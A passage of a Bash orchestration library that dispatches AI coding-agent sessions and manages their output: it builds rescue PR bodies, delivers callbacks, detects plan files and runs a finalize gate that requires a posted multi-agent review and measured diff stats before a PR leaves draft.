# Outputs: the PR body to stdout.
#
# AC4 invariant: with $5..$7 absent or ("no", "", "") the body is BYTE-IDENTICAL
# to the pre-mika#2354 one. That is what makes `MIKA_RESCUE_VERIFY_ENABLED=0` a
# real rollback — one that also changed the shape of the body would not be one.
_compose_rescue_pr_body() {
    local wt_dir="$1" recovery_class="$2" class_fact="$3" issue_num="$4"
    local verified="${5:-no}" failed_term="${6:-}" failed_excerpt="${7:-}"
    local diff_marker issue_ref lede=""
    local verify_marker="" operator_line verify_detail=""

    [ "$verified" = "yes" ] || verified="no"

    if [ "$verified" = "yes" ]; then
        # No object left for the operator gesture: naming it anyway would keep
        # the door shut in the reader's mind after the code opened it.
        operator_line="**Auto-rescued PR.** dispatch-lib measured the local pipeline as complete before opening this PR (mika#2354): the diff carries work, the worktree is clean, \`cargo fmt --all --check\` and \`cargo clippy --workspace --all-targets\` are green, and \`scripts/verify-pipeline.sh origin/main\` passes. That attests the pipeline is complete and the review may begin — not that the work is good, which is what the review decides."
    elif [ -n "$failed_term" ]; then
        # The `no` becomes actionable: it says which term to treat. Before
        # mika#2354 it said only that something, somewhere, was unverified.
        verify_marker="
<!-- rescue-verify-failed: ${failed_term} -->"
        operator_line="**Auto-rescued PR.** dispatch-lib measured the local pipeline as INCOMPLETE before opening this PR (mika#2354): the \`${failed_term}\` term failed. Operator: treat that term, then either un-draft this PR or set the marker above to \`yes\`."
        if [ -n "$failed_excerpt" ]; then
            verify_detail="
<details><summary>rescue-verify-failed: ${failed_term}</summary>

\`\`\`
${failed_excerpt}
\`\`\`

</details>
"
        fi
    else
        # Kill-switch (or a pre-mika#2354 caller): verbatim pre-fix sentence.
        operator_line="**Auto-rescued PR.** Operator: verify pipeline completion, then either un-draft this PR or set the marker above to \`yes\`."
    fi

    if _rescue_diff_carries_work "$wt_dir"; then
        diff_marker="carries-work"
        issue_ref="Closes #${issue_num}"
    else
        diff_marker="incident-only"
        issue_ref="Refs #${issue_num}"
        lede="> **This recovery carries no fix.** Every file in the captured diff is a
> grooming/dispatch artefact, so this PR cannot satisfy any acceptance criterion
> of #${issue_num}. It exists so the captured state is not lost — not to be merged.
> The issue reference at the bottom is deliberately non-closing.

"
    fi

    cat <<RESCUEBODY
${lede}## Auto-rescued PR (dispatch-lib recovery, class: ${recovery_class})

<!-- rescue-pipeline-verified: ${verified} -->
<!-- rescue-diff: ${diff_marker} -->${verify_marker}

This PR was created by dispatch-lib's git-workflow recovery. ${class_fact}

${operator_line}
${verify_detail}
### Recovery metadata
- Recovery class: \`${recovery_class}\`
- Pilot session: \`${SESSION_ID:-unknown}\`
- Turns: ${TURNS:-unknown}
- Cost: \$${COST:-unknown}

${issue_ref}
RESCUEBODY
}

_deliver_callback() {
    # mika#1996: every delivery path crosses the non-empty-output gate. First
    # executable statement, so no future early-return above it can skip it.
    # Delivery outranks measurement: a gate that failed must never be the reason
    # a callback does not arrive. Its own failure is announced rather than
    # swallowed — a silent gate is the defect this ticket exists to remove.
    _gate_non_empty_cycle || echo "cycle_output.gate_error: the non-empty-output gate failed (rc=$?) — delivering the callback unchanged" >&2
    # mika#2155: end the loop's live claim BEFORE the message that can start
    # the next dispatch on this ticket. No-op unless _set_up_worktree claimed
    # (ISSUE_SEAT_CLAIMED=1); the EXIT trap repeats it only if this one failed.
    _release_issue_seat "$REPO" "$ISSUE_NUM" || true
    set +e
    if [ -n "$AGENT" ]; then
        mika ask --task-id "$TASK_ID" --task-complete --agent "$AGENT" -- "$RESULT"
    else
        mika ask --task-id "$TASK_ID" --task-complete -- "$RESULT"
    fi
    CALLBACK_EXIT=$?
    CALLBACK_SENT=1
    # Success path: clean up trace file (mika#887)
    rm -f "$TRACE_FILE"
    set -e

    if [ "$CALLBACK_EXIT" -ne 0 ]; then
        echo "ERROR: callback delivery failed (exit $CALLBACK_EXIT) for task $TASK_ID" >&2
    fi
}

# Le chemin de plan porté par le callout d'un corps d'issue, normalisé — ou rien.
#
# mika#2120 : le second lecteur aveugle. Le callout existe en deux écritures, nue
# (`docs/plans/…`) et préfixée par le dépôt (`mika/docs/plans/…`), et la seconde
# est celle que la spec de grooming prescrivait. Le motif d'origine exigeait
# `docs/plans/` collé au backtick : sur un corps préfixé il rendait une chaîne
# vide, `_detect_plan_on_branch` retournait 0 sans un mot, et le pilote partait
# sur `/mika` au lieu de `/ce-work <plan>`. Corriger `is_groomed` seul aurait
# déplacé la mort ici — la promotion aurait réussi, le dispatch serait mort plus
# loin.
#
# Le segment optionnel est **identique** à celui du prédicat Rust
# (`auto_pull::extract_plan_path`) : un seul segment, premier caractère non
# ponctuel, donc `../docs/plans/` et `a/b/docs/plans/` sont refusés comme
# `docs/brainstorms/` l'est.
#
# **La normalisation est ce qui rend la tolérance utile.** Le chemin est résolu en
# `"$WORKTREE_DIR/$PLAN_PATH"` et `$WORKTREE_DIR` est déjà la racine du
# sous-dépôt : `mika/docs/plans/x.md` y désigne `…/mika/mika/docs/…`, qui
# n'existe pas. Accepter le préfixe sans retirer le segment ne ferait que déplacer
# l'échec d'un `grep` vide à un `-f` faux. C'est exactement ce que fait déjà la
# porte de dispatch (`_committed_plan_on_branch`) en essayant les deux formes.
#
# L'ancrage `^` est ajouté au passage, comme côté Rust : il distingue le callout
# de la prose qui en parle. Il ne distingue pas le callout de sa citation dans un
# bloc de code — cette moitié-là n'existe que côté Rust, où elle garde une
# promotion ; ici un faux positif est déjà rattrapé par le test `-f` qui suit.
_extract_plan_path() {
    local body="$1" path
    path=$(printf '%s\n' "$body" \
        | grep -oP '^> - \*\*Plan:\*\* `\K(?:[A-Za-z0-9_-][A-Za-z0-9._-]*/)?docs/plans/[^`]+' \
        | head -1)
    [ -n "$path" ] || return 1
    case "$path" in
        docs/plans/*) printf '%s\n' "$path" ;;
        */docs/plans/*) printf '%s\n' "${path#*/}" ;;
        *) return 1 ;;
    esac
}

_detect_plan_on_branch() {
    # Plan-on-branch detection (mika#1074): When the issue body contains a groomed
    # plan callout, override ENTRY_COMMAND from "/mika" to "/ce:work <path>".
    # This eliminates the narrate-then-exit failure class — the model no longer
    # needs to "decide" to invoke /ce:work because the entry command does it directly.
    #
    # Only applies to dev-pilot skill. dev-groom has its own entry command.
    # Falls back silently (no-op) when any precondition fails.

    # Guard: only override for dev-pilot
    [ "$SKILL" = "dev-pilot" ] || return 0

    # Guard: need an issue body to parse
    [ -n "$ISSUE_BODY" ] || return 0

    # Guard: need a worktree directory for file validation
    [ -n "$WORKTREE_DIR" ] || return 0

    # Extract plan path from the callout pattern, in either écriture:
    #   > - **Plan:** `docs/plans/<filename>.md` (committed on branch @ <sha>)
    #   > - **Plan:** `<repo>/docs/plans/<filename>.md` (committed on branch @ <sha>)
    # The `docs/plans/` literal is what avoids false positives on prose containing
    # "Plan:" (consistent with the self-dev bypass predicate); the optional repo
    # segment is mika#2120. `_extract_plan_path` returns the path already
    # normalized relative to $WORKTREE_DIR.
    #
    # Guard: no callout, or a callout whose path is not a plan → no-op. The
    # helper never succeeds with an empty path, so its exit code IS the
    # emptiness guard; a second `[ -n "$PLAN_PATH" ]` here would be dead.
    local PLAN_PATH
    PLAN_PATH=$(_extract_plan_path "$ISSUE_BODY") || return 0

    # Validate the plan file exists in the worktree
    if [ -f "$WORKTREE_DIR/$PLAN_PATH" ]; then
        # compound-engineering 3.x renamed `name: ce:work` → `name: ce-work`
        # (CHANGELOG #503). The plugin's `/ce:work` slash command was removed; the
        # canonical invocation is now `/ce-work`. Dispatch-lib must use the new
        # form or claude-pilot exits 7ms with `[error] pipeline_incomplete:` (no
        # API call). See mika#1345.
        ENTRY_COMMAND="/ce-work $PLAN_PATH"
        # mika#2492: `/ce-work` is "implementation and local verification only,
        # without the shipping tail" — this pilot will not open a PR, and that
        # is its perimeter, not a truncation. Stamped HERE, on the line that
        # takes the decision, so the fact travels from its producer instead of
        # being reconstructed downstream. Read by `_pilot_had_no_shipping_tail`.
        PILOT_SHIPPING_TAIL="absent"
        echo "Plan-on-branch detected: overriding entry command to '/ce-work $PLAN_PATH'" >&2
    else
        echo "Plan-on-branch callout found but file not in worktree: $WORKTREE_DIR/$PLAN_PATH — falling back to /mika" >&2
    fi
}

# =============================================================================
# mika#1941 — PR finalize gate (structural invariant on out-of-draft transitions)
#
# Sami directive 2026-08-22 (verbatim):
#   « fais de la preuve de review un INVARIANT DE SORTIE de lane, pas une
#   instruction de brief — concrètement : aucun PR ne quitte wip-rescue/draft
#   tant que la review multi-agent formelle n'est pas POSTÉE sur GH... Une
#   instruction se réinterprète ; un invariant structurel non. »
#
# Three checks compose the gate:
#   AC6 — Verbatim `git diff --stat origin/main..HEAD` + `gh pr view --json`
#         appended to PR body. Reviewer-authoritative ground truth. Rooted
#         in PR#1939 hand-listed-10-files → actual-13 under-count (~700
#         lines mis-reported), which triggered 30 min of sami-MPC roundtrip.
#   AC7 — Formal multi-agent review posted on GH. Rooted in mika#1676 n=1
#         signal (dispatch Agent skipped `/ce:review` despite explicit brief
#         instruction) plus the wip-rescue class (mika#1935/#1936). Structural
#         gate replaces prompt-level instruction that reinterprets under load.
#   AC8 — PR title matches fix intent (rewrites to most-recent conventional-
#         commit subject). Rooted in PR#1935 shipping as
#         `docs(plans): DoD... (#1935)` when actual content was `fix(engine):
#         phantom sweep` — squash-merge picked stale title from 2nd commit.
#
# Companion feedback memories:
#   - feedback_never_skip_ce_review
#   - feedback_prompt_enforcement_fragile
#   - feedback_estimated_counts_undercount_measured
#   - feedback_claim_type_stratifies_verification_reliability
#
# Callers: standalone via `finalize-pr` CLI wrapper (see
# `_shared/finalize-pr`), or by sourcing `dispatch-lib.sh` and invoking
# `_finalize_pr_gate <repo> <pr_num> [wt_dir]`.
# =============================================================================

# _ac8_recent_conventional_commit_title — Find the most recent commit whose
# subject matches conventional-commit format (fix|feat|refactor|chore|perf|
# test|docs|ci|build|style|revert with optional scope + optional bang). Skips
# non-conforming subjects (including `wip(...)` and `Merge ...` lines).
#
# Args:
#   $1 — worktree dir (must be a git checkout)
#
# Outputs: commit subject line on stdout, or empty when no match in last 30
# commits.
_ac8_recent_conventional_commit_title() {
    local wt_dir="$1"
    { [ -d "$wt_dir/.git" ] || [ -f "$wt_dir/.git" ]; } || return 0
    # `|| true` so grep no-match doesn't propagate through pipefail in callers
    git -C "$wt_dir" log -30 --format='%s' HEAD 2>/dev/null | \
        { grep -E '^(fix|feat|refactor|chore|perf|test|docs|ci|build|style|revert)(\([^)]+\))?!?: ' || true; } | \
        head -1
}

# _ac6_verbatim_stats_block — Produce ground-truth diff-stat + PR-view JSON
# markdown block. This is what AC6 requires in the PR body so reviewers and
# sami read measured (not recalled) file/line counts.
#
# The block is signed by a stable header line
# (`## AC6 verbatim ground truth (dispatch-lib finalize gate, mika#1941)`)
# which the gate uses for idempotency.
#
# Args:
#   $1 — worktree dir
#   $2 — PR number
#   $3 — repo (short form, e.g. "mika")
#
# Outputs: markdown block on stdout. Never fails — falls back to sentinel
# strings when git or gh commands fail (so the block is always emitted).
_ac6_verbatim_stats_block() {
    local wt_dir="$1" pr_num="$2" repo="$3"
    local stat_output pr_json
    if { [ -d "$wt_dir/.git" ] || [ -f "$wt_dir/.git" ]; }; then
        stat_output=$(git -C "$wt_dir" diff --stat origin/main..HEAD 2>&1) || \
            stat_output='<git diff --stat failed>'
    else
        stat_output='<worktree not a git repo>'
    fi
    if [ -n "$pr_num" ] && [ -n "$repo" ]; then
        pr_json=$(gh pr view "$pr_num" --repo "senara-solutions/$repo" \
            --json changedFiles,additions,deletions 2>&1) || \
            pr_json='{"error":"gh pr view failed"}'
    else
        pr_json='{"error":"pr_num or repo missing"}'
    fi
    cat <<AC6BLOCK
## AC6 verbatim ground truth (dispatch-lib finalize gate, mika#1941)

Measured — NOT recalled/estimated. Reviewers: treat these two blocks as
authoritative; any hand-listed \`Files changed\` counts elsewhere in this PR
body are informal excerpts.

### \`git diff --stat origin/main..HEAD\`

\`\`\`
$stat_output
\`\`\`

### \`gh pr view $pr_num --repo senara-solutions/$repo --json changedFiles,additions,deletions\`

\`\`\`json
$pr_json
\`\`\`
AC6BLOCK
}

# _ac7_has_formal_multi_agent_review — Detect whether a PR carries a formal
# multi-agent review posted on GitHub.
#
# Formal review detection (either path counts):
#   (a) Any review body contains one of the signature keywords (case-insensitive
#       substring): "/ce:review", "p1/p2/p3", "adversarial", "multi-agent",
#       "multi agent".
#   (b) A review is authored by a trusted reviewer identity: mika-platform-qa,
#       ce-code-review-bot, mika-arch, mika-qa (plus [bot] suffixed variants).
#
# Args:
#   $1 — repo (short form)
#   $2 — pr_num
#
# Returns:
#   0 — formal multi-agent review present
#   1 — no formal review found
#   2 — gh/jq error or invalid args
_ac7_has_formal_multi_agent_review() {
    local repo="$1" pr_num="$2"
    if [ -z "$repo" ] || [ -z "$pr_num" ]; then
        echo "_ac7_has_formal_multi_agent_review: missing repo or pr_num" >&2
        return 2
    fi
    local reviews_json
    reviews_json=$(gh api "repos/senara-solutions/${repo}/pulls/${pr_num}/reviews" 2>/dev/null) || {
        echo "_ac7_has_formal_multi_agent_review: gh api failed for repo=$repo pr=$pr_num" >&2
        return 2
    }
    if ! printf '%s' "$reviews_json" | jq -e 'type == "array"' >/dev/null 2>&1; then
        echo "_ac7_has_formal_multi_agent_review: unexpected reviews payload shape" >&2
        return 2
    fi
    # Path (a): signature keyword in body (case-insensitive substring)
    if printf '%s' "$reviews_json" | jq -e '
        map(select(
            ((.body // "") | ascii_downcase) as $b |
            ($b | contains("/ce:review")) or
            ($b | contains("p1/p2/p3")) or
            ($b | contains("adversarial")) or
            ($b | contains("multi-agent")) or
            ($b | contains("multi agent"))
        )) | length > 0
    ' >/dev/null 2>&1; then
        return 0
    fi
    # Path (b): trusted reviewer identity
    if printf '%s' "$reviews_json" | jq -e '
        map(select([
            (.user.login // "")
        ] | inside([
            "mika-platform-qa", "ce-code-review-bot",
            "mika-arch", "mika-qa",
            "mika-arch[bot]", "mika-qa[bot]",
            "mika-platform-qa[bot]"
        ]))) | length > 0
    ' >/dev/null 2>&1; then
        return 0
    fi
    return 1
}

# _finalize_pr_gate — Structural invariant gate on PR-out-of-draft transitions
# (mika#1941). Applies AC6+AC7+AC8 before a PR may leave draft/wip-rescue.
#
# Behavior:
#   AC8 — rewrite PR title to most-recent conventional-commit subject when it
#         differs from the current title. No-op when no conv-commit is found in
#         the last 30 commits.
#   AC6 — append the verbatim git-stat + gh pr view JSON block to the PR body.
#         Idempotent: skips re-append when the AC6 header signature is already
#         present in the body.
#   AC7 — check for formal multi-agent review; when absent, add the
#         `needs-multi-agent-review` label + return exit 1 so the caller
#         (wip_rescue auto-resume, correctif Agent, operator) can auto-heal
#         or bail-to-human. When present, remove the label if it was set.
#
# Args:
#   $1 — repo (short form)
#   $2 — pr_num
#   $3 — worktree dir (default: $PWD)
#
# Exit codes:
#   0 — all three gates green (AC6+AC8 applied, AC7 present)
#   1 — AC7 review missing (AC6+AC8 still applied; caller must gate un-draft)
#   2 — invalid args
#   3 — gh CLI failure on title/body update
_finalize_pr_gate() {
    local repo="$1" pr_num="$2" wt_dir="${3:-$PWD}"
    if [ -z "$repo" ] || [ -z "$pr_num" ]; then
        echo "_finalize_pr_gate: missing repo or pr_num" >&2
        return 2
    fi

    # AC8 — title-gate
    local new_title current_title
    new_title=$(_ac8_recent_conventional_commit_title "$wt_dir")
    current_title=$(gh pr view "$pr_num" --repo "senara-solutions/$repo" \
        --json title --jq '.title' 2>/dev/null) || {
        echo "_finalize_pr_gate: gh pr view (title) failed for repo=$repo pr=$pr_num" >&2
        return 3
    }
    if [ -n "$new_title" ] && [ "$new_title" != "$current_title" ]; then
        echo "_finalize_pr_gate: AC8 rewriting title: '$current_title' -> '$new_title'" >&2
        gh pr edit "$pr_num" --repo "senara-solutions/$repo" --title "$new_title" >/dev/null 2>&1 || {
            echo "_finalize_pr_gate: AC8 title update failed" >&2
            return 3
        }
    fi

    # AC6 — verbatim stats footer (refresh-in-place: strip stale block if
    # present, then append fresh. Idempotent on unchanged git-stat content;
    # correctly refreshes after rebase / new commits — the founding-incident
    # class this gate exists to prevent.)
    local current_body
    current_body=$(gh pr view "$pr_num" --repo "senara-solutions/$repo" \
        --json body --jq '.body' 2>/dev/null) || {
        echo "_finalize_pr_gate: gh pr view (body) failed for repo=$repo pr=$pr_num" >&2
        return 3
    }
    # Strip any prior AC6 block by finding the horizontal-rule separator that
    # immediately precedes the AC6 header and cutting from there to end.
    # The gate always appends its block LAST, so end-cut is safe.
    local stripped_body
    if grep -qF -- 'AC6 verbatim ground truth (dispatch-lib finalize gate, mika#1941)' <<<"$current_body"; then
        # Two-pass strip:
        #   1. awk exit-on-marker cuts everything from the AC6 header line to EOF
        #   2. awk end-trim removes trailing blank lines + trailing `---` separator
        # The gate always appends the block LAST, so end-cut is safe.
        stripped_body=$(printf '%s' "$current_body" | awk '
            /^## AC6 verbatim ground truth \(dispatch-lib finalize gate, mika#1941\)$/ { exit }
            { print }
        ' | awk '
            { lines[NR] = $0 }
            END {
                n = NR
                while (n > 0 && (lines[n] ~ /^[[:space:]]*$/ || lines[n] == "---")) n--
                for (i = 1; i <= n; i++) print lines[i]
            }
        ')
    else
        stripped_body="$current_body"
    fi
    local stats_block new_body
    stats_block=$(_ac6_verbatim_stats_block "$wt_dir" "$pr_num" "$repo")
    new_body="${stripped_body}

---

${stats_block}"
    echo "_finalize_pr_gate: AC6 refreshing verbatim ground-truth block" >&2
    gh pr edit "$pr_num" --repo "senara-solutions/$repo" --body "$new_body" >/dev/null 2>&1 || {
        echo "_finalize_pr_gate: AC6 body update failed" >&2
        return 3
    }

    # AC7 — formal multi-agent review presence gate
    _ac7_has_formal_multi_agent_review "$repo" "$pr_num"
    local ac7_rc=$?
    case "$ac7_rc" in
        0)
            # Green — remove `needs-multi-agent-review` if previously added
            gh pr edit "$pr_num" --repo "senara-solutions/$repo" \
                --remove-label "needs-multi-agent-review" >/dev/null 2>&1 || true
            return 0
            ;;
        1)
            echo "_finalize_pr_gate: AC7 formal multi-agent review MISSING on PR #$pr_num — adding needs-multi-agent-review label" >&2
            gh pr edit "$pr_num" --repo "senara-solutions/$repo" \
                --add-label "needs-multi-agent-review" >/dev/null 2>&1 || true
            return 1
            ;;
        *)
            echo "_finalize_pr_gate: AC7 check errored (rc=$ac7_rc)" >&2
            return 3
            ;;
    esac
}

# --- Public API ---

# Single entrypoint. No args — entry command is derived from the $SKILL field
# in the input JSON via the case switch below.
# Reads JSON from process stdin (fd 0) — inherited from the calling handler script.
# Sets up worktree, scrubs env, invokes relay, installs EXIT trap, runs claude-pilot.
# Delivers result via callback when complete.
dispatch_claude_pilot() {
    # --- Diagnostic trace (mika#887) ---
    TRACE_FILE="/tmp/dev-pilot-trace-$$.log"
    # Restrict trace file to owner-only (0600) to prevent local users from reading
    # secrets that may appear in the trace before _setup_gh_auth's set+x guard (mika#903).
    _umask_prev=$(umask)
    umask 077
    exec 9>>"$TRACE_FILE" 2>/dev/null || exec 9>/dev/null
    umask "$_umask_prev"
    BASH_XTRACEFD=9
    set -x

    # Ensure ~/.local/bin is in PATH (mika CLI needed for callback delivery)
    export PATH="$HOME/.local/bin:$PATH"

    # Dependency checks
    command -v jq >/dev/null 2>&1 || { echo "Error: jq is required but not installed" >&2; exit 1; }
    command -v mika >/dev/null 2>&1 || { echo "Error: mika CLI is required but not in PATH" >&2; exit 1; }
    command -v claude-pilot >/dev/null 2>&1 || { echo "Error: claude-pilot CLI is required but not in PATH" >&2; exit 1; }

    # claude-pilot venv smoke test (mika#1200): force the import chain that imports
    # yaml (and all other dependencies) to actually execute. Relies on cli.py keeping
    # its imports at module top level — if cli.py is ever refactored to lazy-import
    # .agent / .permissions inside main(), THIS smoke test silently stops detecting
    # the failure class. See
    # mika/docs/plans/2026-05-18-001-bug-dev-groom-pilot-empty-handed-plan.md
    # § Phase 0 Pin / cli.py invariant.
    if ! timeout 15 claude-pilot --help >/dev/null 2>&9; then
        cat >&2 <<'EOF'
Error: claude-pilot venv is broken — `claude-pilot --help` exited non-zero.
Most likely cause: pyproject.toml changed in claude-pilot-py without an
accompanying `uv tool install` to re-sync dependencies. Editable installs pick
up new source automatically but do NOT auto-install new declared dependencies.

To restore the loop:
    cd <mika-platform-root> && uv tool install --force --editable ./claude-pilot-py

Reference: mika#1200 +
mika/docs/plans/2026-05-18-001-bug-dev-groom-pilot-empty-handed-plan.md
EOF
        exit 1
    fi

    # mika-platform root — base for sub-repo resolution
    PLATFORM_DIR="${MIKA_PLATFORM_DIR:-$HOME/workspace/mika-platform}"
    PLATFORM_DIR=$(cd "$PLATFORM_DIR" 2>/dev/null && pwd -P) || PLATFORM_DIR="${MIKA_PLATFORM_DIR:-$HOME/workspace/mika-platform}"
    PLATFORM_REPO_NAME=$(basename "$PLATFORM_DIR")

    # Initialize callback guard
    CALLBACK_SENT=0
    # mika#2155: the EXIT trap reads this; it must exist even when
    # _set_up_worktree was never reached.
    ISSUE_SEAT_CLAIMED=0

    _parse_input_json

    # Install EXIT trap for crash-recovery callback delivery
    trap '_dispatch_lib_exit_trap' EXIT
    # Install TERM trap for cancel discriminator (mika#749)
    trap '_dispatch_lib_term_trap' TERM

    _validate_inputs

    # PER-SKILL DISPATCH MAPPING (mika#932 origin, mika#1173 per-tool revert)
    # Each arm maps a SKILL value to its slash-command entry point. After the
    # mika#1173 revert, each dispatch skill owns its own tool (dev-pilot →
    # run_claude_pilot, dev-groom → run_claude_pilot_groom), so a given arm
    # fires only when the matching tool's handler sources this lib.
    # Adding a new dispatch sibling requires:
    #   1. Create the skill's tools.json registering its own tool name.
    #   2. Create the skill's handlers/run.sh that sources this lib and calls
    #      dispatch_claude_pilot.
    #   3. Add a new arm below mapping its SKILL value → ENTRY_COMMAND.
    #   4. Add the skill to the relevant well-known agent allowlist
    #      (well_known_agents.rs MIKA_*_IDENTITY).
    #   5. Update self-dev/system_prompt.md to teach mika-dev when to dispatch.
    # Threshold for refactor: if N>5 dispatch skills, consider engine-side
    # routing helpers. Until then, the case switch is the contract.
    local ENTRY_COMMAND
    case "$SKILL" in
      dev-pilot)
        ENTRY_COMMAND="/mika"
        # mika#2492: declare the pilot's shipping perimeter at the site that
        # decides it. `/mika` carries plan → work → review → … → git push +
        # gh pr create, so this pilot is expected to open its own PR and a
        # commit-without-PR really is a truncation. `_detect_plan_on_branch`
        # overwrites this with `absent` when it overrides the entry command.
        PILOT_SHIPPING_TAIL="present"
        # mika#940: signal claude-pilot to fail the session if `gh pr create`
        # is never invoked. Caught by the source-level pipeline_incomplete
        # detection in claude-pilot-py (Unit 2). Defense-in-depth against the
        # premature-EndTurn family observed on 2026-05-02 (mika#931, #938,
        # #939) — the model emits `[done] Success` after Edit-heavy phases
        # before reaching git push + gh pr create.
        export CLAUDE_PILOT_REQUIRE_PR=1
        ;;
      dev-groom)
        # As of mika#1271 sub-PR 8: autonomous-loop pilot uses /mika-groom-plan-only
        # (content-only — generate plan, commit, push, exit). Architect convergence
        # + canonical body-callout write are owned by dispatch-lib's _iterate_groom_loop
        # below. /mika-groom-ticket remains the operator-facing full pipeline
        # (Phase 1-6 + architect + body callout + comment) and is unchanged.
        ENTRY_COMMAND="/mika-groom-plan-only"
        # Early-exit guard (mika#1097 Layer B): dev-groom sessions MUST produce
        # tool calls (at minimum: gh issue view, git worktree, /ce:plan, git commit/push).
        # If the session exits "success" with fewer than this threshold, claude-pilot
        # re-prompts once; a second early-exit emits early_exit_zero_action.
        # Threshold unchanged from /mika-groom-ticket — /mika-groom-plan-only still
        # produces 5+ tool calls (issue view, /ce:plan, file edits, git add/commit/push).
        export CLAUDE_PILOT_MIN_TOOL_CALLS="${CLAUDE_PILOT_MIN_TOOL_CALLS:-3}"
        ;;
      *) echo "Unknown skill: $SKILL" >&2; exit 1 ;;
    esac
    _setup_gh_auth
    _scrub_env
    _set_up_worktree
    _detect_plan_on_branch
    _handle_dry_run
    _run_claude_pilot "$ENTRY_COMMAND"

    # mika#1318 — pilot push guard (defense-in-depth). Called unconditionally;
    # skill-scoping is internal (early-return for non-dev-groom). If violation
    # detected, poison RESULT and skip iterate loop + push — deliver callback
    # immediately so mika-dev receives the violation.
    if ! _check_pilot_force_push; then
        RESULT="STRUCTURAL VIOLATION: pilot push detected (mika#1318). The dev-groom pilot pushed to the remote during its session — this is a scope-of-authority violation. Push is dispatch-lib's responsibility, not the pilot's.

Evidence: ${PUSH_VIOLATION_EVIDENCE}

Outcome: PIPELINE_INCOMPLETE — push violation

${RESULT}"
        _deliver_callback
        return
    fi

    # mika#1271 — iterate-loop state machine (always-on for dev-groom).
    # Invokes mika-arch first-pass on the plan-on-branch, then second-pass on READY
    # or ITERATE-then-revise; on GROOMED writes the canonical body callout via
    # _write_canonical_callout (idempotent vs. the pilot's organic write); on ESCALATE
    # appends a structured PIPELINE FAILURE marker to RESULT.
    #
    # As of sub-PR 7b the Class D recovery shim is retired — dispatch-lib's
    # iterate loop + canonical writer is the sole structural authority for the
    # body callout. The pilot's organic write in the dev-groom skill prompt
    # remains as a fallback until the dev-groom-prompt-update follow-up
    # ships. See docs/plans/2026-05-25-009-feat-1271-class-d-shim-retire-plan.md.
    # mika#1772: skip convergence entirely on a terminated session — there is no
    # plan on the branch to hand the architect, and running it anyway is what
    # manufactured the "architect convergence did not complete" callback on the
    # 2026-08-28 dispatches of mika#2013.
    if [ "$SKILL" = "dev-groom" ] && [ "${PILOT_SESSION_TERMINATED:-0}" != "1" ]; then
        if _iterate_groom_loop; then
            # mika#1394: Architect converged on GROOMED — unconditionally override
            # the outcome to PLAN_GROOMED. The previous sed only matched
            # "Outcome: PLAN_COMMITTED"; on re-dispatch the plan validation block
            # may have already set PIPELINE_INCOMPLETE (e.g., plan created on a
            # prior day), making the old sed a no-op. The canonical callout was
            # written and the grooming is complete — strip any stale PIPELINE
            # FAILURE markers and set the authoritative outcome.
            RESULT=$(printf '%s' "$RESULT" | sed '/^PIPELINE FAILURE:/d')
            RESULT=$(printf '%s' "$RESULT" | sed 's/Outcome: .*/Outcome: PLAN_GROOMED/')
            # Safety net: if no Outcome: line existed (edge case), append one.
            if ! grep -qF -- 'Outcome: PLAN_GROOMED' <<<"$RESULT"; then
                RESULT="${RESULT}

Outcome: PLAN_GROOMED"
            fi
        else
            # mika#1333: propagate architect-convergence failure into RESULT.
            # Replaces the silent-tolerance pattern that caused mid-flow
            # short-circuit (plan committed but architect never ran/failed).
            # mika#1772: the reason comes from the loop, which is the only thing
            # that knows which of its 18 exits fired. The sentence that used to
            # sit here named architect convergence for all of them, including
            # the guard trips that never reach the architect.
            local _groom_reason="${GROOM_LOOP_FAILURE_REASON:-no reason recorded}"
            # Escaped for use as a sed replacement below: backslash first, then
            # the delimiter and `&` (which sed expands to the whole match).
            local _groom_reason_sed="${_groom_reason//\\/\\\\}"
            _groom_reason_sed="${_groom_reason_sed//\//\\/}"
            _groom_reason_sed="${_groom_reason_sed//&/\\&}"

            # The plan claim is measured, not asserted — but by the measurement
            # that can actually answer on this run. `_committed_plan_on_branch`
            # asks the REMOTE, and needs a `> - **Plan:**` callout in the issue
            # body to ask at all; on a first grooming neither holds — the plan is
            # committed locally and the push happens further down — so it would
            # stay silent in exactly the case the line exists for. VALID_PLAN is
            # the worktree answer `_find_issue_plan` already resolved this run.
            # Two measurements, two sentences; never one sentence for both.
            local _groom_plan_line=""
            local _groom_plan_path
            if [ -n "${VALID_PLAN:-}" ]; then
                _groom_plan_line="
Plan in worktree: ${VALID_PLAN} — the architect verdict is what is missing, not the plan."
            elif _groom_plan_path=$(_committed_plan_on_branch "$SUB_REPO_DIR" "$BRANCH" "$ISSUE_BODY" "$REPO" "$ISSUE_NUM" 2>/dev/null); then
                _groom_plan_line="
Plan on remote branch: ${_groom_plan_path} — the architect verdict is what is missing, not the plan."
            fi

            # mika#1394: match any Outcome: line (not just PLAN_COMMITTED) to
            # handle re-dispatch where PIPELINE_INCOMPLETE was already set.
            RESULT=$(printf '%s' "$RESULT" | sed "s/Outcome: .*/Outcome: PIPELINE_INCOMPLETE — ${_groom_reason_sed}/")
            # If no Outcome: line existed, append one.
            if ! grep -qF -- 'Outcome: PIPELINE_INCOMPLETE' <<<"$RESULT"; then
                RESULT="${RESULT}

Outcome: PIPELINE_INCOMPLETE — ${_groom_reason}"
            fi
            RESULT="PIPELINE FAILURE: grooming did not converge — ${_groom_reason} (_iterate_groom_loop returned non-zero).${_groom_plan_line}

${RESULT}"
        fi
    fi

    # mika#1772 (R6): suppress only the EMPTY-branch push a terminated session
    # produces — the `mode=first-push` that put a plan-less branch on origin for
    # mika#2013. The flag alone is sufficient because _pilot_left_no_work already
    # gated it on a clean tree and an unmoved HEAD: a session killed AFTER
    # committing never sets it, so its work still reaches origin. That matters —
    # _push_branch publishes any local-ahead commits regardless of exit code, and
    # the next dispatch force-removes this worktree, so a blanket skip on
    # termination would destroy the late-hang work mika#1901 describes.
    if [ "${PILOT_SESSION_TERMINATED:-0}" = "1" ]; then
        RESULT="${RESULT}

Push: SKIPPED — session terminated with no new commits; there is nothing to publish."
    else
        _push_branch
    fi

    # mika#2151: the canonical push site is behind us — whatever the net
    # rescued is now in whatever PR the branch carries, so say so on that PR.
    # Called unconditionally: the function guards itself, and its entry guard
    # returns before any `gh` call when nothing was rescued (the majority case).
    # That also covers the terminated-session branch above, which reaches here
    # having skipped the push: PILOT_SESSION_TERMINATED is only set on a clean
    # tree with an unmoved HEAD, so the net never fired and nothing is pending.
    _signal_rescue_into_open_pr

    # Unit 2 (mika#1282 + mika#1396): open a draft PR when content was rescued
    # by dispatch-lib's git-workflow ownership.
    #
    # Recovery classes:
    # - "dirty-worktree" (mika#1282 original): pilot wrote files but never committed.
